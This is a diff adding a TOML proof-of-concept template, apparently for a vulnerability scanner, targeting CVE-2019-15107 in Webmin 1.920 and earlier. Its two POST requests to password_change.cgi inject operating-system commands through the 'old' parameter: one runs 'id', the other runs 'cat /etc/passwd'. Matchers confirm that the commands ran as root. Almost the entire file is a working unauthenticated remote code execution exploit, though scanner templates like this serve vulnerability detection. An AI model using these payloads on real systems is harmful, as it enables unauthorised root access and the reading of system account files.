@@ -1,0 +1,59 @@
+[info]
+author = "AVE"
+description = "Webmin 1.920 及更早版本的 password_change.cgi 存在未授权远程命令执行漏洞。攻击者无需认证即可通过构造特制 POST 请求，在 old 参数中注入系统命令，以 root 权限执行任意命令。"
+id = "POC-AVE-2019-0609"
+name = "Webmin 1.920 未授权远程命令执行漏洞 PoC"
+severity = "critical"
+tags = [
+    "cve-2019-15107",
+    "webmin",
+    "rce",
+]
+vuln_id = [
+    "CVE-2019-15107",
+    "AVE-2019-0609",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/password_change.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "user=root&pam=&old=id&new=test&confirm=test"
+type = "raw"
+
+[poc.requests.body.headers]
+Content-Type = "application/x-www-form-urlencoded"
+Referer = "{{BaseURL}}/session_login.cgi"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "uid=",
+    "root:",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/password_change.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "user=root&pam=&old=cat%20/etc/passwd&new=test&confirm=test"
+type = "raw"
+
+[poc.requests.body.headers]
+Content-Type = "application/x-www-form-urlencoded"
+Referer = "{{BaseURL}}/session_login.cgi"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["root:x:0:0:"]
